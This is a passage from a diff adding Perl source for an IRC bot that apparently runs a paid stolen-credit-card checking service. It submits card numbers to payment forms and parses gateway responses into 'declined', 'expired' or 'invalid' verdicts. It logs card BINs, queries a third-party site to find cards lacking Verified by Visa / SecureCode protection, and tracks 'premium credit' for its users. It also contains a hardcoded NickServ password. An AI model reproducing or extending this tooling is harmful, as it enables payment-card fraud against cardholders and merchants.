+    #&respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: An error occurred during processing - 4[0,1MARKED LOST4] 7BANK 0:14 IMMEDIATELY UPDATED! 0-7 Premium Credit 0:9 $balance ");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+############################################################################################################
+    }elsif ($allo =~/A duplicate transaction has been submitted./){
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    #&respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: Card Submitted - 4[0,1CARD REJECTED4] 7BANK 0:10 $10- 7Premium Credit 0:9 $balance ");
+    }
+    }
+    if($bank == 0){
+    #&respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: Card Submitted - 4[0,1CARD REJECTED4] 7BANK 0:14 IMMEDIATELY UPDATED! 0-7 Premium Credit 0:9 $balance ");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+############################################################################################################
+    }elsif ($allo =~/The credit card has expired./){
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    #&respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 7CARD EXPIRED14,1 0- 4[0,1CARD REJECTED4] 0- 7BANK 0:10 $10- 7Premium Credit 0:9 $balance ");
+    }
+    }
+    if($bank == 0){
+    #&respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 7CARD EXPIRED14,1 0- 4[0,1CARD REJECTED4] 0- 7BANK 0:14 IMMEDIATELY UPDATED! 0-7 Premium Credit 0:9 $balance ");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+############################################################################################################
+    }elsif ($allo =~/This transaction cannot be accepted at this time./){
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    #&respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-4 MERCHANT DOWN 0- 4[0,1CARD REJECTED4] 0- 7BANK 0:10 $10- 7Premium Credit 0:9 $balance \r\n");
+    }
+    }
+    if($bank == 0){
+    #&respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-4 MERCHANT DOWN 0- 4[0,1CARD REJECTED4] 0- 7BANK 0:14 IMMEDIATELY UPDATED! 0-7 Premium Credit 0:9 $balance \r\n");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+############################################################################################################
+    }elsif ($allo =~/The merchant does not accept this type of credit card./){
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    #&respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 7CARD NUMBER INVALID14,1 0- 4[0,1CARD REJECTED4] 0- 7BANK 0:10 $10- 7Premium Credit 0:9 $balance \r\n");
+    }
+    }
+    if($bank == 0){
+    #&respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 7CARD NUMBER INVALID14,1 0- 4[0,1CARD REJECTED4] 0- 7BANK 0:10 IMMEDIATELY UPDATED! 0-7 Premium Credit 0:9 $balance \r\n");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+############################################################################################################
+    }elsif ($allo =~/This transaction has been declined./){
+print "\t\t\t[CC Declined]\n";
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    $irc_socket->write("PRIVMSG $nick 7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 4DECLINED 0-14 Decline 0- 7BANK 0:10 $10- 7Premium Credit 0:9 $balance \r\n");
+    #&respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 4DECLINED 0-14 Decline 0- 7BANK 0:10 $10- 7Premium Credit 0:9 $balance ");
+    }
+    }
+    if($bank == 0){
+    irc_socket->write("PRIVSMG $nick 7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 4DECLINED 0-14 Decline 0- 7BANK 0:10 $10- 7Premium Credit 0:9 $balance");
+    #&respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 4DECLINED 0-14 Decline 0- 7BANK 0:14 IMMEDIATELY UPDATED! 0-7 Premium Credit 0:9 $balance ");
+    #addlog("bankinfo.txt", "BIN : $nuova");
+    }
+############################################################################################################
+    }elsif ($allo =~/Your order has been received. Thank you for your business!/){
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-4 MERCHANT DOWN 0- 4[0,1CARD REJECTED4] 0- 7BANK 0:10 $10- 7Premium Credit 0:9 $balance ");
+    }
+    }
+    if($bank == 0){
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-4 MERCHANT DOWN 0- 4[0,1CARD REJECTED4] 0- 7BANK 0:14 IMMEDIATELY UPDATED! 0-7 Premium Credit 0:9 $balance ");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+############################################################################################################
+    }elsif ($allo =~/The credit card number is invalid./){
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    $$irc_socket->write("PRIVMSG $nick 7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 7CARD NUMBER INVALID14,1 0- 4[0,1CARD REJECTED4] 0- 7BANK 0:10 $10- 7Premium Credit 0:9 $balance ");
+    #&respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 7CARD NUMBER INVALID14,1 0- 4[0,1CARD REJECTED4] 0- 7BANK 0:10 $10- 7Premium Credit 0:9 $balance ");
+    }
+    }
+    if($bank == 0){
+    $irc_socket->write("PRIVMSG $nick 7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 7CARD NUMBER INVALID14,1 0- 4[0,1CARD REJECTED4] 0- 7BANK 0:14 IMMEDIATELY UPDATED! 0-7 Premium Credit 0:9 $balance ");
+    #&respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 7CARD NUMBER INVALID14,1 0- 4[0,1CARD REJECTED4] 0- 7BANK 0:14 IMMEDIATELY UPDATED! 0-7 Premium Credit 0:9 $balance ");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+############################################################################################################
+    print "card $variable!";
+    }
+    }
+    }elsif ($allo =~/Credit card expiration date is invalid./){
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 7CARD EXPIRED14,1 0- 4[0,1CARD REJECTED4] 0- 7BANK 0:10 $10- 7Premium Credit 0:9 $balance ");
+    }
+    }
+    if($bank == 0){
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 7CARD EXPIRED14,1 0- 4[0,1CARD REJECTED4] 0- 7BANK 0:14 IMMEDIATELY UPDATED! 0-7 Premium Credit 0:9 $balance ");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+    }
+################################################################################################################################################
+################################################################################################################################################
+
+if($msg{'what'} =~ /\!bank\s+(\d{6})/ && $auto == 1){
+		my ($card) = ($1);
+		my $database = "bank.txt";
+		open FILE,"$database" or die "Errore nell'apertura: $!";
+		my @results=<FILE>;
+		close FILE;
+		my $bank = 0;
+		my $nuova = substr($card,0,6);
+		foreach my $url (@results){
+		if($url =~m/$nuova\ - (.*)/&& $bank == 0) {
+		$bank = 1;
+		&respond_to_privmsg(\%msg,"3,1 $nuova 0,1:10 $1");
+	        }
+		}
+		if($bank == 0){
+		&respond_to_privmsg(\%msg,"3,1 $nuova 0,1: 14Could Not Retreive Bank Name! ");
+		}
+		}
+
+
+################################################################################################################################################
+################################################################################################################################################
+
+if($msg{'what'} =~ /\!state\s+(.*)/ && $auto == 1){
+		my ($states) = ($1);
+
+						my $database = "state.txt";
+						open FILE,"$database" or die "Errore nell'apertura: $!";
+						my @results=<FILE>;
+						close FILE;
+						my $wow = $1;
+my $statex = substr($states,0,2);
+foreach my $url (@results){
+if($url =~ /$statex\|(.*)/){
+$states = 1;				
+                                        &respond_to_privmsg(\%msg,"7,1 $statex 0:10 $1 "); 
+}
+}
+if($states == 0){
+					&respond_to_privmsg(\%msg,"7,1 $nick 0:14,1 State Not Found! 4[15Checking For USA & CANADA4] ");
+}
+}
+
+################################################################################################################################################
+################################################################################################################################################
+
+	if($msg{'what'} =~ /^!ip (.*)/)
+		{
+		my ($iploca) = ($1);
+		&respond_to_privmsg(\%msg,"");
+print "\n";
+my $agent = WWW::Mechanize->new( autocheck => 1 );
+my $formfiller = WWW::Mechanize::FormFiller->new();
+$agent->env_proxy();
+$agent->get('http://www.ipligence.com/geolocation');
+$agent->form_number(1) if $agent->forms and scalar @{$agent->forms};
+{ local $^W; $agent->current_form->value('ip', ''.$iploca.''); };
+  $agent->submit();
+  print $agent->content,"\n";
+  my $ipse=$agent->content;
+  if ($ipse =~ m/Your IP address is(.*)<br>City:(.*)<br\/>Country:(.*)<br>Continent:(.*)<br>Time/g){
+  my ($ipaddress,$city,$country,$continent) = ($1,$2,$3,$4);
+  &respond_to_privmsg(\%msg,"7,1 IP City15:9 $city 0| 7IP Country15:9 $country 0| 7Continent15:9 $continent ");
+}
+elsif ($ipse =~/Invalid address or IP not found/){
+&respond_to_privmsg(\%msg,"4,1 Invalid IP Address! ");
+}
+}
+
+
+################################################################################################################################################
+################################################################################################################################################
+
+ 	 if($msg{'what'} =~ /^!dns (.*)/)
+        {
+        my ($hostname) = ($1);
+        &respond_to_privmsg(\%msg,"4,1 [7 Dns 04] 0Checking: 9$hostname ");
+print "\n";
+my $agent = WWW::Mechanize->new( autocheck => 1 );
+my $formfiller = WWW::Mechanize::FormFiller->new();
+$agent->env_proxy();
+  $agent->get('http://www.ipligence.com/geolocation');
+   $agent->form_number(1) if $agent->forms and scalar @{$agent->forms};
+  { local $^W; $agent->current_form->value('ip', ''.$hostname.''); };
+  $agent->submit();
+  print $agent->content,"\n";
+my $dnschk=$agent->content;
+if ($dnschk =~ m/Your IP address is(.*)<br>City:(.*)<br\/>Country:(.*)<br>Continent:(.*)<br>Time/g){
+my ($resolved,$city,$country,$continent) = ($1,$2,$3,$4);
+&respond_to_privmsg(\%msg,"4,1 [7 Dns 4]0 Resolved to 9$resolved ");
+}
+elsif ($dnschk =~/Invalid address or IP not found/){
+        &respond_to_privmsg(\%msg,"4,1 [07 Dns 4] 4Could not Resolve Hostname ");
+        }
+        }
+
+################################################################################################################################################
+################################################################################################################################################
+
+if($msg{'what'} =~ /^!nozip\s+(\d{4,5})/){
+		my ($zipcheck) = ($1);
+print "\n";
+my $agent = WWW::Mechanize->new( autocheck => 1 );
+my $formfiller = WWW::Mechanize::FormFiller->new();
+$agent->env_proxy();
+$agent->get('http://www.zipinfo.com/cgi-local/zipsrch.exe?cnty=cnty&ac=ac&zip=');
+$agent->form_number(1) if $agent->forms and scalar @{$agent->forms};
+  { local $^W; $agent->current_form->value('zip', ''.$zipcheck.''); };
+  $agent->submit();
+  print $agent->content,"\n";
+my $zipse=$agent->content;
+if ($zipse =~/<td align=center>(.*)<\/font><\/td><td align=center>(.*)<\/font><\/td><td align=center>(.*)<\/font><\/td><td align=center>(.*)<\/font><\/td><td align=center>(.*)<\/font><\/td><td align=center>(.*)<\/font>/g){
+my ($city) = ($1);
+my ($state) = ($2);
+my ($zipcodes) = ($3);
+my ($county) = ($4);
+my ($fips) = ($5);
+my ($area) = ($6);
+		&respond_to_privmsg(\%msg,"7,1 $zipcheck 0:3 $city 0-3 $state 0-3 $area ");
+}
+elsif ($zipse =~/is not currently assigned by the US Postal Service to any city./){
+		&respond_to_privmsg(\%msg,"7,1 $zipcheck 0:14 Zip Not Found! ");
+}
+elsif ($zipse =~/is not a valid ZIP code./){
+		&respond_to_privmsg(\%msg,"7,1 $zipcheck 0:14 Zip Not Valid! ");
+}
+}
+
+################################################################################################################################################
+################################################################################################################################################
+
+if($msg{'what'} =~ /^!port\s+(.*?)\s+(.*)/ && $auto == 1){
+		my ($ipaddress) = $1;
+		my ($port) = $2;
+                &respond_to_privmsg(\%msg,"9,1 Check:7 $ipaddress 0:7 $port ");
+print "\n";
+my $agent = WWW::Mechanize->new( autocheck => 1 );
+my $formfiller = WWW::Mechanize::FormFiller->new();
+$agent->env_proxy();
+$agent->get('http://ping.eu/port-chk/');
+$agent->form_number(1) if $agent->forms and scalar @{$agent->forms};
+  $agent->form_number(1);
+{ local $^W; $agent->current_form->value('host', ''.$ipaddress.''); };
+{ local $^W; $agent->current_form->value('port', ''.$port.''); };
+  $agent->submit();
+     print $agent->content,"\n";
+    my $allo=$agent->content;
+if ($allo =~/open/){
+		&respond_to_privmsg(\%msg,"9,1 Port is Open! ");
+    }
+if ($allo =~/closed/){
+		&respond_to_privmsg(\%msg,"4,1 Port is Close! ");
+}
+if ($allo =~/Wrong port number/){
+		&respond_to_privmsg(\%msg,"4,1 ! Invalid Port ! ");
+}
+}
+################################################################################################################################################
+################################################################################################################################################
+
+if($msg{'what'} =~ /^!novbv\s+(\d{16})/ && $auto == 9){
+                my ($numerocarta) = ($1);
+                if (substr($numerocarta,0,1)==4) {
+                $varType = 1;
+		&respond_to_privmsg(\%msg,"4,1[0Checking VBV...4]0 $numerocarta");
+                }
+                if (substr($numerocarta,0,1)==5) {
+                $varType = 2;
+                &respond_to_privmsg(\%msg,"4,1[0Checking MCSC..4]0 $numerocarta");
+                }
+	        print "\n";
+		my $agent = WWW::Mechanize->new( autocheck => 1 );
+		my $formfiller = WWW::Mechanize::FormFiller->new();
+		$agent->env_proxy();
+		$agent->get('http://electronicpromo.net/vbv/');
+		$agent->form_number(1) if $agent->forms and scalar @{$agent->forms};
+  		{ local $^W; $agent->current_form->value('cclist', ''.$numerocarta.''); };
+        	$agent->submit();
+     		print $agent->content,"\n";
+     		my $allo=$agent->content;
+		if ($allo =~/PROTECTION NOT ACTIVE/){
+		&respond_to_privmsg(\%msg,"4,1[0Results........4] 0,12VBV15,1 / 0,4MC0,7SC8,1 is 4Disabled!");
+		}
+    		if ($allo =~/PROTECTION ACTIVE/){ 
+		&respond_to_privmsg(\%msg,"4,1[0Results........4] 0,12VBV15,1 / 0,4MC0,7SC8,1 is 9Enabled!"); 
+		}
+		if ($allo =~/INVALID/){ 
+		&respond_to_privmsg(\%msg,"4,1[0Results........4] 0,12VBV15,1 / 0,4MC0,7SC8,1 is 14Invalid!"); 
+		}
+		if ($allo =~/Unknown/) {
+		&respond_to_privmsg(\%msg,"4,1[0Results........4] 0,12VBV15,1 / 0,4MC0,7SC8,1 is 7Unknown!");
+		}
+		if ($allo =~/No Pass/) {
+		&respond_to_privmsg(\%msg,"4,1[0Results........4] 0,12VBV15,1 / 0,4MC0,7SC8,1 is 7No Pass!");
+		}
+                }
+toEnd:
+Akhir:
+
+################################################################################################################################################
+
+	sub chkcredit()
+	{
+   	my $creditfile = "credit.txt";
+ 	my $nick = $_[0];
+ 	my $open = open(CR,"<",$creditfile);
+ 	if(!$open){
+ 	#$irc_socket->write("privmsg $channel :Can't Open Credit Database\r\n");
+ 	goto stop;
+ 	return(3);
+ 	}else{
+ 	my @lines = <CR>;
+ 	foreach $line (@lines){
+ 	if($line =~ m/$nick/){
+ 	return(2);
+ 	} # End if $line
+ 	} # Endforeach
+ 	} # End else
+ 	return(1);
+ 	stop:
+ 	AddLog($creditfile,"");
+ 	
+ 	}
+
+ 	sub addcredit(){
+ 	my $nick = $_[0];
+ 	my $credit = $_[1];
+ 	my $data = $nick."|".$credit;
+ 	open(FILE,'>>',$creditfile);
+ 	print FILE $data . "\n";
+ 	close(FILE);
+ 	}
+
+################################################################################################################################################
+        
+	}
+	sub ctrl_admin()
+	{
+	my $data = $_[0];
+	foreach my $admin ( @admin )
+	{
+	if($admin eq $data->{'from'})
+	{
+	return(0);
+	}
+	}
+	&respond_to_privmsg($data,"");
+	return(-1);
+	}
+	}
+
+################################################################################################################################################
+
+	sub ctrl_premium()
+	{
+	my $data = $_[0];
+	foreach my $premium ( @admin )
+	{
+	if($premium eq $data->{'from'})
+	{
+	return(0);
+        goto stop;
+	}
+	}
+	&respond_to_privmsg($data,"");
+	return(-1);
+        stop:
+
+################################################################################################################################################
+
+sub respond_to_privmsg()
+{
+	my ($data,$m) = ($_[0],$_[1]);
+	if($data->{'to'} =~ /#/)
+	{
+		&privmsg($data->{'to'},$m);
+	}
+	return(0);
+}
+################################################################################################################################################
+
+	sub privmsg()
+	{
+	my($nick,$send) = @_;
+	$irc_socket ->write("PRIVMSG ".$nick." :".$send."\r\n");
+	}
+
+################################################################################################################################################
+
+	sub join_all()
+	{
+	foreach my $chan ( @chans )
+	{
+	$irc_socket->write("JOIN ".$chan."\r\n");
+	}
+	}
+
+################################################################################################################################################
+
+sub get_msg()
+{
+	my $line = $_[0];
+	my %data;
+	if($line =~ /:(.*?)!(.*?) PRIVMSG(.*?) :(.*)/)
+	{
+   $irc_socket->write("PRIVMSG #pay :$1 $3 =>> $4 \r\n");
+		$data{'from'} = $1;
+		$data{'to'}   = $3;
+		$data{'what'} = $4;
+	}
+        ### By Payment
+        addlog("prolog.txt", " [ProBot Log] $1 $3 msg=>> $4");
+        #print " [ProBot Log] $1 $3 =>> $4 \r\n";
+	return(%data);
+}
+################################################################################################################################################
+
+    	sub http_request()
+    	{
+        my($site,$request,$ua,$resp,$cnt);
+        $site    =  $_[0];
+        $site    =~ s/[\r\n]//g;  
+        $request =  HTTP::Request->new(GET => $site);
+        $ua      =  LWP::UserAgent->new(agent => $user_agents[rand(scalar(@user_agents))]);
+        $ua->timeout($timeout);
+        $resp    =  $ua->request($request);
+        $cnt     =  $resp->content();
+        return($cnt);
+    	}
+     
+################################################################################################################################################
+
+    	sub get_user_agents()
+    	{
+        my @us_ag = (
+        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511",
+        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1",
+        "Opera/8.5 (X11; Linux i686; U; cs)",
+        "Links (2.1pre17; Linux 2.6.11-gentoo-r8 i686; 80x24)"
+        );
+        return(@us_ag);
+    	}
+    	 
+################################################################################################################################################
+
+    	sub get_all_host()
+    	{
+        my $site =  $_[0];
+        my @dirs =  ();
+        my @ret  =  ();
+        my $tmp  =  "";
+        $site    =~ s/http:\/\///g;
+        $site    =~ s/[\r\n]//g;
+        $site    =~ s/\/\///g;
+        if($site !~ /\/$/)
+        {
+        $site .= "/";
+        }
+     
+        @dirs = split(/\//,$site);
+        $tmp = $dirs[0] . "/";
+        push(@ret,$tmp);
+           
+        for($i = 1; $i < scalar(@dirs); $i++)
+        {
+        $tmp .= $dirs[$i] . "/";
+        push(@ret,$tmp);
+        }
+           
+        return(@ret);
+    	}
+     
+################################################################################################################################################
+
+    	sub urlencode()
+    	{
+     	my $str = $_[0];
+     	$str =~ s/([^A-Za-z0-9])/sprintf("%%%02X", ord($1))/seg;
+     	return $str;
+    	}
+     
+################################################################################################################################################
+
+    	sub unique()
+    	{
+        my @unici = ();
+        my %visti = ();
+        foreach my $elemento (@_) {
+        $elemento =~ s/\/+/\//g;
+        next if $visti{$elemento}++;
+        push @unici, $elemento;
+        }
+        return @unici;
+    	}
+     
+################################################################################################################################################
+
+    	sub canghecmd()
+    	{
+        my $n = $_[0];
+        push(@botcmd,$n);
+    	}
+     
+################################################################################################################################################
+
+    	sub read_all_file_array()
+    	{
+        my $file = $_[0];
+        my @ret  = ();
+     
+        open(FILE,'<',$file);
+        while($a = <FILE>)
+        {
+        $a =~ s/[\r\n]//g;
+        push(@ret,$a);
+        }
+        close(FILE);
+           
+        return(@ret);
+    	}
+     
+################################################################################################################################################
+
+    	sub write_to_file_array()
+    	{
+        my ($file,$data,$scal) = @_;
+        for($i = 0; $i < $scal; $i++)
+        {
+        &write_to_file($file,$data->[$i]);
+        }
+    	}
+     
+################################################################################################################################################
+
+    	sub write_to_file()
+    	{
+        my($file,$data) = @_;
+        open(FILE,'>>',$file);
+        print FILE $data . "\n";
+        close(FILE);
+     	}
+     	}
+
+################################################################################################################################################
+
+	sub addlog {
+	$fileName = $_[0];
+	$text = $_[1];
+	if(open(MYFILE, ">>$fileName")) {
+        print MYFILE "$text\n";
+        close (MYFILE);
+	}
+	}
+
+###############################################################################################################################################
+
+	sub flood_check
+	{
+  	my $fc = shift; # max flood events count
+  	my $fp = shift; # max flood time period for $fc events
+  	my $en = shift; # event name (key) which identifies flood check data
+
+  	$FLOOD{ $en } ||= [];   # make empty flood array for this event name
+  	my $ar = $FLOOD{ $en }; # get array ref for event's flood array
+  	my $ec = @$ar;          # events count in the flood array
+  
+  	if( $ec >= $fc ) 
+    	{
+    	# flood array has enough events to do real flood check
+    	my $ot = $$ar[0];      # oldest event timestamp in the flood array
+    	my $tp = time() - $ot; # time period between current and oldest event
+    
+    	# now calculate time in seconds until next allowed event
+    	my $wait = int( ( $ot + ( $ec * $fp / $fc ) ) - time() );
+    	if( $wait > 3 )
+      	{
+      	# positive number of seconds means flood in progress
+      	# event should be rejected or postponed
+      	return($wait);
+      	}
+   	# negative or 0 seconds means that event should be accepted
+    	# oldest event is removed from the flood array
+    	shift @$ar;
+    	}
+  	# flood array is not full or oldest event is already removed
+  	# so current event has to be added
+  	push  @$ar, time();
+  	# event is ok
+  	return($wait);
+	}
+
+###############################################################################################################################################
+
+	sub read_file {
+	my ($filename) = @_;
+ 
+	open my $in, '<:encoding(UTF-8)', $filename or die "Could not open '$filename' for reading $!";
+	local $/ = undef;
+	my $all = <$in>;
+	close $in;
+ 
+	return $all;
+	}
+ 
+	sub write_file {
+	my ($filename, $content) = @_;
+ 
+	open my $out, '>:encoding(UTF-8)', $filename or die "Could not open '$filename' for writing $!";;
+	print $out $content;
+	close $out;
+ 
+	return;
+	}
+###############################################################################################################################################
+       sub reconnect() 
+        {
+        foreach my $irc_socket ( @admin )
+	{
+                $irc_socket->connect($hosting,$port);
+		$irc_socket->write("USER ".$ident." 8 PayBOT * : \r\n");
+		$irc_socket->write("NICK ".$nkpro."\r\n");
+                $irc_socket->write("NICKSERV IDENTIFY binary1511987\r\n");
+                $irc_socket->write("JOIN #test 1511\r\n");
+                $irc_socket->write("JOIN #payment\r\n");
+        }
+        }
+
+###############################################################################################################################################
+sub initThreads{
+        # An array to place our threads in
+	my @initThreads;
+	for(my $i = 1;$i<=$num_of_threads;$i++){
+		push(@initThreads,$i);
+	}
+	return @initThreads;
+}
+###############################################################################################################################################
+sub doOperation{
+	# Get the thread id. Allows each thread to be identified.
+	my $id = threads->tid();
+	my $i = 0;
+	while($i < 100000000){
+			$i++
+	}
+	#print "Thread $id done!\n";
+	# Exit the thread
+	threads->exit();
+}
+$a = <>;
+###############################################################################################################################################
